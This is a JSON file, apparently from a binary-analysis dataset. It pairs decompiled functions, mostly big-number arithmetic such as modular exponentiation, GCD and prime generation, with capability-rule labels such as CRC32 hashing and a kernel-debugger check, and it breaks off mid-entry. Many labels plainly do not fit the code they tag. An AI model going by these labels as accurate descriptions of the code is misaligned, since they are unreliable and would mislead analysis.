{
    "00401120": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401120(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x423ab0;\n    (*_sym.imp.gdiplus.dll_GdipDeleteBrush)(in_ECX[1]);\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 4) == 0) {\n            (*_sym.imp.gdiplus.dll_GdipFree)();\n            return;\n        }\n        fcn.004014c0();\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0040a5e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a5e0(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, ulong *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint var_64ch;\n    uint var_644h;\n    uint var_640h;\n    int32_t var_63ch;\n    int32_t var_638h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_34h = &var_4h;\n    var_4h = NULL;\n    var_3ch = 1;\n    var_38h = 1;\n    iVar1 = fcn.00409e80(arg_14h, &var_3ch);\n    if ((0 < iVar1) && (var_8h = **(arg_14h + 8),  (var_8h & 1) != 0)) {\n        var_34h = &var_4h;\n        var_4h = NULL;\n        var_3ch = 1;\n        var_38h = 1;\n        iVar1 = fcn.00409e80(arg_10h, &var_3ch);\n        if (-1 < iVar1) {\n            uVar4 = 0x20;\n            uVar5 = (var_8h * 2 + 4U & 8) + var_8h;\n            do {\n                uVar4 = uVar4 >> 1;\n                uVar5 = uVar5 * (2 - uVar5 * var_8h);\n            } while (7 < uVar4);\n            _var_30h = 1;\n            iVar1 = ~uVar5 + 1;\n            var_28h = 0;\n            var_24h = 1;\n            var_20h = 0;\n            var_1ch = 0;\n            var_48h = 1;\n            var_44h = 0;\n            var_40h = 0;\n            fcn.004124f0(&var_64ch, 0, 0x600);\n            uVar4 = fcn.00409d40(arg_10h);\n            if (uVar4 < 0x2a0) {\n                if (uVar4 < 0xf0) {\n                    if (uVar4 < 0x50) {\n                        var_ch = (-(0x17 < uVar4) & 2) + 1;\n                    }\n                    else {\n                        var_ch = 0x4;\n                    }\n                }\n                else {\n                    var_ch = 0x5;\n                }\n            }\n            else {\n                var_ch = 0x6;\n            }\n            var_8h = *(arg_14h + 4) + 1;\n            puVar2 = fcn.0040b470(arg_8h, var_8h);\n            if (((puVar2 == NULL) && (puVar2 = fcn.0040b470(&var_640h, var_8h),  puVar2 == NULL)) &&\n               (puVar2 = fcn.0040b470(&var_24h, var_8h * 2),  puVar2 == NULL)) {\n                var_4ch = *arg_ch;\n                if (var_4ch == -1) {\n                    puVar2 = fcn.00409f60(&var_48h, arg_ch);\n                    if (puVar2 != NULL) goto code_r0x0040abbd;\n                    arg_ch = &var_48h;\n                    var_48h = 1;\n                }\n                if ((arg_18h == NULL) || (*(arg_18h + 1) == 0)) {\n                    puVar2 = fcn.0040bbf0(&var_30h, 1);\n                    if ((puVar2 != NULL) ||\n                       ((puVar2 = fcn.0040c1f0(&var_30h, *(arg_14h + 4) << 6),  puVar2 != NULL ||\n                        (puVar2 = fcn.0040bd30(&var_30h, &var_30h, arg_14h),  puVar2 != NULL)))) goto code_r0x0040abbd;\n                    if (arg_18h != NULL) {\n                        *arg_18h = _var_30h;\n                        *(arg_18h + 1) = var_28h;\n                    }\n                }\n                else {\n                    _var_30h = *arg_18h;\n                    var_28h = *(arg_18h + 1);\n                }\n                iVar3 = fcn.00409e80(arg_ch, arg_14h);\n                if (iVar3 < 0) {\n                    puVar2 = fcn.00409f60(&var_640h, arg_ch);\n                }\n                else {\n                    puVar2 = fcn.0040bd30(&var_640h, arg_ch, arg_14h);\n                }\n                if ((((puVar2 == NULL) &&\n                     (puVar2 = fcn.0040cc70(&var_640h, &var_30h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) &&\n                    (puVar2 = fcn.00409f60(arg_8h, &var_30h),  puVar2 == NULL)) &&\n                   (puVar2 = fcn.0040cd90(arg_8h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) {\n                    if (0x1 < var_ch) {\n                        var_14h = var_ch - 1;\n                        var_4h = 1 << (var_14h & 0x1f);\n                        var_8h = &var_64ch + var_4h * 3;\n                        puVar2 = fcn.0040b470(var_8h, *(arg_14h + 4) + 1);\n                        if ((puVar2 != NULL) || (puVar2 = fcn.00409f60(var_8h, &var_640h),  puVar2 != NULL))\n                        goto code_r0x0040abbd;\n                        var_18h = puVar2;\n                        if (var_14h != NULL) {\n                            do {\n                                puVar2 = fcn.0040cc70(var_8h, var_8h, arg_14h, iVar1, &var_24h);\n                                if (puVar2 != NULL) goto code_r0x0040abbd;\n                                var_18h = var_18h + 1;\n                            } while (var_18h < var_14h);\n                        }\n                        var_8h = var_4h + 1;\n                        var_4h = 1 << (var_ch & 0x1f);\n                        if (var_8h < var_4h) {\n                            var_10h = &var_64ch + var_8h * 3;\n                            do {\n                                puVar2 = fcn.0040b470(var_10h, *(arg_14h + 4) + 1);\n                                if (((puVar2 != NULL) || (puVar2 = fcn.00409f60(var_10h, var_10h + -3),  puVar2 != NULL)\n                                    ) || (puVar2 = fcn.0040cc70(var_10h, &var_640h, arg_14h, iVar1, &var_24h), \n                                         puVar2 != NULL)) goto code_r0x0040abbd;\n                                var_8h = var_8h + 1;\n                                var_10h = var_10h + 3;\n                            } while (var_8h < var_4h);\n                        }\n                    }\n                    puVar6 = NULL;\n                    var_4h = NULL;\n                    var_18h = *(arg_10h + 4);\n                    var_8h = NULL;\n                    puVar7 = var_ch;\n                    var_14h = puVar6;\n                    var_10h = puVar6;\n                    do {\n                        do {\n                            while( true ) {\n                                if (var_4h == NULL) {\n                                    if (var_18h == NULL) {\n                                        var_4h = NULL;\n                                        if (puVar6 == NULL) goto code_r0x0040ab5d;\n                                        goto code_r0x0040ab00;\n                                    }\n                                    var_18h = var_18h - 1;\n                                    var_4h = 0x20;\n                                }\n                                var_4h = var_4h - 1;\n                                uVar4 = *(*(arg_10h + 8) + var_18h * 4) >> (var_4h & 0x1f) & 1;\n                                if (uVar4 == 0) break;\ncode_r0x0040aa76:\n                                var_14h = puVar6 + 1;\n                                var_8h = 0x2;\n                                var_10h = var_10h | uVar4 << (puVar7 - var_14h & 0x1fU);\n                                puVar6 = var_14h;\n                                if (var_14h == puVar7) {\n                                    puVar7 = NULL;\n                                    do {\n                                        puVar2 = fcn.0040cc70(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                                        if (puVar2 != NULL) goto code_r0x0040abbd;\n                                        puVar7 = puVar7 + 1;\n                                    } while (puVar7 < var_ch);\n                                    puVar2 = fcn.0040cc70(arg_8h, &var_64ch + var_10h * 3, arg_14h, iVar1, &var_24h);\n                                    if (puVar2 != NULL) goto code_r0x0040abbd;\n                                    var_8h = 0x1;\n                                    puVar7 = var_ch;\n                                    puVar6 = puVar2;\n                                    var_14h = puVar2;\n                                    var_10h = puVar2;\n                                }\n                            }\n                        } while (var_8h == NULL);\n                        if (var_8h != 0x1) goto code_r0x0040aa76;\n                        puVar2 = fcn.0040cc70(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                        puVar7 = var_ch;\n                        puVar6 = var_14h;\n                    } while (puVar2 == NULL);\n                }\n            }\ncode_r0x0040abbd:\n            uVar4 = 1 << (var_ch & 0x1f);\n            uVar5 = 1 << (var_ch - 1 & 0x1f);\n            if (uVar5 < uVar4) {\n                var_4h = uVar4 - uVar5;\n                piVar8 = &var_644h + uVar5 * 3;\n                do {\n                    if (piVar8 != 0x8) {\n                        iVar1 = *piVar8;\n                        if (iVar1 != 0) {\n                            fcn.0040eda0(iVar1, piVar8[-1] << 2);\n                            sub.msvcrt.dll_free(iVar1);\n                        }\n                        piVar8[-2] = 1;\n                        piVar8[-1] = 0;\n                        *piVar8 = 0;\n                    }\n                    piVar8 = piVar8 + 3;\n                    var_4h = var_4h - 1;\n                } while (var_4h != NULL);\n            }\n            if (var_638h != 0) {\n                fcn.0040eda0(var_638h, var_63ch << 2);\n                sub.msvcrt.dll_free(var_638h);\n            }\n            iVar1 = var_1ch;\n            if (var_1ch != 0) {\n                fcn.0040eda0(var_1ch, var_20h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_40h;\n            if (var_40h != 0) {\n                fcn.0040eda0(var_40h, var_44h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_28h;\n            if (((arg_18h == NULL) || (*(arg_18h + 1) == 0)) && (var_28h != 0)) {\n                fcn.0040eda0(var_28h, var_2ch << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            return puVar2;\n        }\n    }\n    return 0xfffffffc;\n    while (var_4h = var_4h + 1,  var_4h < var_14h) {\ncode_r0x0040ab00:\n        puVar2 = fcn.0040cc70(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n        if ((puVar2 != NULL) ||\n           ((var_10h = var_10h * 2,  (var_10h & 1 << (var_ch & 0x1f)) != 0 &&\n            (puVar2 = fcn.0040cc70(arg_8h, &var_640h, arg_14h, iVar1, &var_24h),  puVar2 != NULL))))\n        goto code_r0x0040abbd;\n    }\ncode_r0x0040ab5d:\n    var_34h = &var_4h;\n    var_4h = 0x1;\n    var_3ch = 1;\n    var_38h = 1;\n    puVar2 = fcn.0040cc70(arg_8h, &var_3ch, arg_14h, iVar1, &var_24h);\n    if ((((puVar2 == NULL) && (var_4ch == -1)) && (*(arg_10h + 4) != 0)) && ((**(arg_10h + 8) & 1) != 0)) {\n        *arg_8h = 0xffffffff;\n        puVar2 = fcn.00409cd0(arg_8h, arg_14h, arg_8h);\n    }\n    goto code_r0x0040abbd;\n}\n",
        "token_count": 3415
    },
    "0040ae20": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ae20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_20h = 1;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 1;\n    var_10h = 0;\n    var_ch = 0;\n    uVar2 = fcn.00409f60(&var_20h, arg_ch);\n    iVar4 = 0;\n    if ((uVar2 == 0) && (uVar2 = fcn.00409f60(&var_14h, arg_10h),  iVar4 = var_ch,  uVar2 == 0)) {\n        uVar2 = fcn.0040bba0(&var_20h);\n        uVar3 = fcn.0040bba0(&var_14h);\n        if (uVar2 <= uVar3) {\n            uVar3 = uVar2;\n        }\n        var_8h = uVar3;\n        uVar2 = fcn.0040c330(&var_20h, uVar3);\n        iVar4 = var_ch;\n        if ((uVar2 == 0) && (uVar2 = fcn.0040c330(&var_14h, uVar3),  iVar4 = var_ch,  uVar2 == 0)) {\n            var_24h = &var_4h;\n            var_14h = 1;\n            var_20h = 1;\n            var_4h = 0;\n            var_2ch = 1;\n            var_28h = 1;\n            iVar4 = fcn.00409e80(&var_20h, &var_2ch);\n            while (iVar4 != 0) {\n                iVar4 = 0;\n                uVar2 = 0;\n                if (var_1ch != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_18h + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040af3e;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_1ch);\n                }\n                iVar4 = 0;\ncode_r0x0040af3e:\n                uVar2 = fcn.0040c330(&var_20h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b04a;\n                iVar4 = 0;\n                if (var_10h != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_ch + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040af7e;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_10h);\n                }\n                iVar4 = 0;\ncode_r0x0040af7e:\n                uVar2 = fcn.0040c330(&var_14h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b04a;\n                iVar4 = fcn.00409e80(&var_20h, &var_14h);\n                if (iVar4 < 0) {\n                    uVar2 = fcn.0040c440(&var_14h, &var_14h, &var_20h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040b04a;\n                    arg_8h_00 = &var_14h;\n                }\n                else {\n                    uVar2 = fcn.0040c440(&var_20h, &var_20h, &var_14h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040b04a;\n                    arg_8h_00 = &var_20h;\n                }\n                uVar2 = fcn.0040c330(arg_8h_00, 1);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040b04a;\n                var_24h = &var_4h;\n                var_2ch = 1;\n                var_28h = 1;\n                iVar4 = fcn.00409e80(&var_20h, &var_2ch);\n                uVar3 = var_8h;\n            }\n            uVar2 = fcn.0040c1f0(&var_14h, uVar3);\n            iVar4 = var_ch;\n            if (uVar2 == 0) {\n                uVar2 = fcn.00409f60(arg_8h, &var_14h);\n                iVar4 = var_ch;\n            }\n        }\n    }\ncode_r0x0040b04a:\n    iVar1 = var_18h;\n    if (var_18h != 0) {\n        fcn.0040eda0(var_18h, var_1ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    if (iVar4 != 0) {\n        fcn.0040eda0(iVar4, var_10h << 2);\n        sub.msvcrt.dll_free(iVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 1440
    },
    "0040b090": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b090(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (0x1ffd < arg_ch - 3) {\n        return -4;\n    }\n    var_18h = 1;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = ((arg_ch & 0x1f) != 0) + (arg_ch >> 5);\n    if ((arg_10h & 2) == 0) {\n        if (arg_ch < 0x514) {\n            if (arg_ch < 0x352) {\n                if (arg_ch < 0x28a) {\n                    if (arg_ch < 0x15e) {\n                        if (arg_ch < 0xfa) {\n                            iVar3 = (-(arg_ch < 0x96) & 9) + 0x12;\n                        }\n                        else {\n                            iVar3 = 0xc;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 4;\n                }\n            }\n            else {\n                iVar3 = 3;\n            }\n        }\n        else {\n            iVar3 = 2;\n        }\n    }\n    else if (arg_ch < 0x5aa) {\n        if (arg_ch < 0x47e) {\n            if (arg_ch < 1000) {\n                if (arg_ch < 0x352) {\n                    if (arg_ch < 0x2ee) {\n                        if (arg_ch < 500) {\n                            if (arg_ch < 0xfa) {\n                                iVar3 = (-(arg_ch < 0x96) & 0xb) + 0x28;\n                            }\n                            else {\n                                iVar3 = 0x1c;\n                            }\n                        }\n                        else {\n                            iVar3 = 0xd;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 7;\n                }\n            }\n            else {\n                iVar3 = 6;\n            }\n        }\n        else {\n            iVar3 = 5;\n        }\n    }\n    else {\n        iVar3 = 4;\n    }\n    var_8h = var_ch * 4;\n    var_4h = iVar3;\n    iVar2 = fcn.0040acd0(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\ncode_r0x0040b1f0:\n    if (0xb504f333 < *(arg_8h[2] + -4 + var_8h)) {\n        if ((arg_ch < var_ch * 0x20) && (iVar2 = fcn.0040c330(arg_8h, var_ch * 0x20 - arg_ch),  iVar2 != 0)) {\n            return iVar2;\n        }\n        *arg_8h[2] = *arg_8h[2] | 1;\n        if ((arg_10h & 1) != 0) {\n            uVar5 = 0;\n            *arg_8h[2] = *arg_8h[2] | 2;\n            arg_ch = arg_8h[1];\n            if (arg_ch != 0) {\n                puVar4 = arg_8h[2] + (arg_ch + -1) * 4;\n                iVar2 = arg_ch;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + -1;\n                    uVar5 = (((uVar5 << 0x10 | uVar1 >> 0x10) % 3) * 0x10000 | uVar1 & 0xffff) % 3;\n                    iVar2 = iVar2 + -1;\n                    iVar3 = var_4h;\n                } while (iVar2 != 0);\n            }\n            if (*arg_8h < 0) {\n                if (uVar5 != 0) {\n                    uVar5 = 3 - uVar5;\n                    goto code_r0x0040b2d7;\n                }\ncode_r0x0040b2db:\n                arg_ch = 8;\ncode_r0x0040b2f0:\n                var_1ch = &arg_ch;\n                var_24h = 1;\n                var_20h = 1;\n                iVar2 = fcn.00409cd0(arg_8h, arg_8h, &var_24h);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            else {\ncode_r0x0040b2d7:\n                if (uVar5 == 0) goto code_r0x0040b2db;\n                if (uVar5 == 1) {\n                    arg_ch = 4;\n                    goto code_r0x0040b2f0;\n                }\n            }\n            iVar2 = fcn.00409f60(&var_18h, arg_8h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c330(&var_18h, 1);\n                while (((iVar2 == 0 &&\n                        ((((iVar2 = fcn.0040c740(arg_8h),  iVar2 != 0 || (iVar2 = fcn.0040c740(&var_18h),  iVar2 != 0))\n                          || (iVar2 = fcn.0040c7e0(arg_8h, iVar3, arg_14h, arg_18h),  iVar2 != 0)) ||\n                         (iVar2 = fcn.0040c7e0(&var_18h, iVar3, arg_14h, arg_18h),  iVar2 != 0)))) && (iVar2 == -0xe)))\n                {\n                    var_1ch = &arg_ch;\n                    arg_ch = 0xc;\n                    var_24h = 1;\n                    var_20h = 1;\n                    iVar2 = fcn.00409cd0(arg_8h, arg_8h, &var_24h);\n                    if (iVar2 != 0) break;\n                    var_28h = &arg_ch;\n                    arg_ch = 6;\n                    var_30h = 1;\n                    var_2ch = 1;\n                    iVar2 = fcn.00409cd0(&var_18h, &var_18h, &var_30h);\n                }\n            }\n            iVar3 = var_10h;\n            if (var_10h == 0) {\n                return iVar2;\n            }\n            fcn.0040eda0(var_10h, var_14h << 2);\n            sub.msvcrt.dll_free(iVar3);\n            return iVar2;\n        }\n        iVar2 = fcn.0040bab0(arg_8h, iVar3, arg_14h, arg_18h);\n        if (iVar2 != -0xe) {\n            return iVar2;\n        }\n    }\n    iVar2 = fcn.0040acd0(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    goto code_r0x0040b1f0;\n}\n",
        "token_count": 1773
    },
    "0040b440": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b440(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    if (*(arg_8h + 4) << 5 <= arg_ch) {\n        return 0;\n    }\n    return *(*(arg_8h + 8) + (arg_ch >> 5) * 4) >> (arg_ch & 0x1f) & 1;\n}\n",
        "token_count": 94
    },
    "0040b500": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b500(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint *arg_10h_00;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint8_t *var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint8_t *var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint8_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_74h = &var_4h;\n    var_4h = 1;\n    var_7ch = 1;\n    var_78h = 1;\n    iVar4 = fcn.00409e80(arg_10h, &var_7ch);\n    if (iVar4 < 1) {\n        return -4;\n    }\n    var_58h = 1;\n    var_54h = 0;\n    var_50h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = NULL;\n    var_28h = 1;\n    var_24h = 0;\n    var_20h = NULL;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = NULL;\n    var_70h = 1;\n    var_6ch = 0;\n    var_68h = 0;\n    var_64h = 1;\n    var_60h = 0;\n    var_5ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = NULL;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = NULL;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = NULL;\n    iVar4 = fcn.0040ae20(&var_70h, arg_ch, arg_10h);\n    if (iVar4 == 0) {\n        var_74h = &var_4h;\n        var_4h = 1;\n        var_7ch = 1;\n        var_78h = 1;\n        iVar4 = fcn.00409e80(&var_70h, &var_7ch);\n        if (iVar4 == 0) {\n            iVar4 = fcn.0040bd30(&var_58h, arg_ch, arg_10h);\n            if (((((iVar4 == 0) && (iVar4 = fcn.00409f60(&var_1ch, &var_58h),  iVar4 == 0)) &&\n                 (iVar4 = fcn.00409f60(&var_64h, arg_10h),  iVar4 == 0)) &&\n                ((iVar4 = fcn.00409f60(&var_40h, arg_10h),  iVar4 == 0 &&\n                 (iVar4 = fcn.0040bbf0(&var_28h, 1),  iVar4 == 0)))) &&\n               ((iVar4 = fcn.0040bbf0(&var_34h, 0),  iVar4 == 0 &&\n                ((iVar4 = fcn.0040bbf0(&var_10h, 0),  iVar4 == 0 && (iVar4 = fcn.0040bbf0(&var_4ch, 1),  iVar4 == 0)))))\n               ) {\n                do {\n                    uVar1 = *var_14h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.0040c330(&var_1ch, 1);\n                        if (((iVar4 != 0) ||\n                            ((((*var_20h & 1) != 0 || ((*var_2ch & 1) != 0)) &&\n                             ((iVar4 = fcn.00409cd0(&var_28h, &var_28h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.0040c550(&var_34h, &var_34h, &var_58h),  iVar4 != 0)))))) ||\n                           ((iVar4 = fcn.0040c330(&var_28h, 1),  iVar4 != 0 ||\n                            (iVar4 = fcn.0040c330(&var_34h, 1),  iVar4 != 0)))) goto code_r0x0040b99c;\n                        uVar1 = *var_14h;\n                    }\n                    uVar1 = *var_38h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.0040c330(&var_40h, 1);\n                        if ((iVar4 != 0) ||\n                           (((((*var_8h & 1) != 0 || ((*var_44h & 1) != 0)) &&\n                             ((iVar4 = fcn.00409cd0(&var_10h, &var_10h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.0040c550(&var_4ch, &var_4ch, &var_58h),  iVar4 != 0)))) ||\n                            ((iVar4 = fcn.0040c330(&var_10h, 1),  iVar4 != 0 ||\n                             (iVar4 = fcn.0040c330(&var_4ch, 1),  iVar4 != 0)))))) goto code_r0x0040b99c;\n                        uVar1 = *var_38h;\n                    }\n                    iVar4 = fcn.00409e80(&var_1ch, &var_40h);\n                    if (iVar4 < 0) {\n                        iVar4 = fcn.0040c550(&var_40h, &var_40h, &var_1ch);\n                        if ((iVar4 != 0) || (iVar4 = fcn.0040c550(&var_10h, &var_10h, &var_28h),  iVar4 != 0))\n                        goto code_r0x0040b99c;\n                        arg_10h_00 = &var_34h;\n                        arg_8h_00 = &var_4ch;\n                    }\n                    else {\n                        iVar4 = fcn.0040c550(&var_1ch, &var_1ch, &var_40h);\n                        if ((iVar4 != 0) || (iVar4 = fcn.0040c550(&var_28h, &var_28h, &var_10h),  iVar4 != 0))\n                        goto code_r0x0040b99c;\n                        arg_10h_00 = &var_4ch;\n                        arg_8h_00 = &var_34h;\n                    }\n                    iVar4 = fcn.0040c550(arg_8h_00, arg_8h_00, arg_10h_00);\n                    if (iVar4 != 0) goto code_r0x0040b99c;\n                    iVar4 = fcn.00409e40(&var_1ch, 0);\n                } while (iVar4 != 0);\n                iVar4 = fcn.00409e40(&var_10h, 0);\n                while (iVar4 < 0) {\n                    iVar4 = fcn.00409cd0(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x0040b99c;\n                    iVar4 = fcn.00409e40(&var_10h, 0);\n                }\n                iVar4 = fcn.00409e80(&var_10h, arg_10h);\n                while (-1 < iVar4) {\n                    iVar4 = fcn.0040c550(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x0040b99c;\n                    iVar4 = fcn.00409e80(&var_10h, arg_10h);\n                }\n                iVar4 = fcn.00409f60(arg_8h, &var_10h);\n            }\ncode_r0x0040b99c:\n            iVar2 = var_50h;\n            if (var_50h != 0) {\n                fcn.0040eda0(var_50h, var_54h << 2);\n                sub.msvcrt.dll_free(iVar2);\n            }\n            puVar3 = var_14h;\n            if (var_14h != NULL) {\n                fcn.0040eda0(var_14h, var_18h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_20h;\n            if (var_20h != NULL) {\n                fcn.0040eda0(var_20h, var_24h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_2ch;\n            if (var_2ch != NULL) {\n                fcn.0040eda0(var_2ch, var_30h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n        }\n        else {\n            iVar4 = -0xe;\n        }\n    }\n    iVar2 = var_68h;\n    if (var_68h != 0) {\n        fcn.0040eda0(var_68h, var_6ch << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    iVar2 = var_5ch;\n    if (var_5ch != 0) {\n        fcn.0040eda0(var_5ch, var_60h << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    puVar3 = var_38h;\n    if (var_38h != NULL) {\n        fcn.0040eda0(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_8h;\n    if (var_8h != NULL) {\n        fcn.0040eda0(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_44h;\n    if (var_44h != NULL) {\n        fcn.0040eda0(var_44h, var_48h << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 2603
    },
    "0040bba0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bba0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar2 = 0;\n    uVar4 = 0;\n    if (*(arg_8h + 4) != 0) {\n        puVar3 = *(arg_8h + 8);\n        do {\n            uVar1 = 0;\n            do {\n                if ((*puVar3 >> (uVar1 & 0x1f) & 1) != 0) {\n                    return iVar2;\n                }\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 1;\n            } while (uVar1 < 0x20);\n            uVar4 = uVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (uVar4 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "0040bc90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
